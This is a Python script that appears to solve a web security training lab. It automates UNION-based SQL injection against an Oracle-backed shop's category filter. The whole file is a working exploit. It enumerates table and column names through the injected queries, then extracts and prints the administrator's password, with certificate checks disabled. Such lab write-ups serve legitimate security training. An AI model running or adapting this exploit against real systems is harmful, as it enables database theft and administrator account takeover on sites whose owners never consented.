import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection attack, listing the database contents on Oracle"


def perform_request(url, sql_payload, proxies):
    path = "/filter?category=Gifts"
    r = requests.get(url.rstrip('/') + path + sql_payload,
                     verify=False, proxies=proxies)
    return r.text


def sqli_users_table(url, proxies):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = perform_request(url, sql_payload, proxies)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    return users_table


def sqli_users_columns(url, users_table, proxies):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % users_table
    res = perform_request(url, sql_payload, proxies)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column


def sqli_administrator_cred(url, users_table, username_column, password_column, proxies):
    sql_payload = "' UNION select %s, %s from %s--" % (
        username_column, password_column, users_table)
    res = perform_request(url, sql_payload, proxies)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(
        text="administrator").parent.findNext('td').contents[0]
    return admin_password


def run(url, payload=None, proxies=None):
    print("Looking for the users table...")
    users_table = sqli_users_table(url, proxies)
    if users_table:
        print("Found the users table name: %s" % users_table)
        username_column, password_column = sqli_users_columns(
            url, users_table, proxies)
        if username_column and password_column:
            print("Found the username column name: %s " % username_column)
            print("Found the password column name: %s" % password_column)

            admin_password = sqli_administrator_cred(
                url, users_table, username_column, password_column, proxies)
            if admin_password:
                print("[+] The administrator password is: %s " %
                      admin_password)
                return True
            else:
                print("Did not find the administrator password")
                return False
        else:
            print("Did not find the username and/or the password columns")
            return False
    else:
        print("Did not find a users table.")
        return False
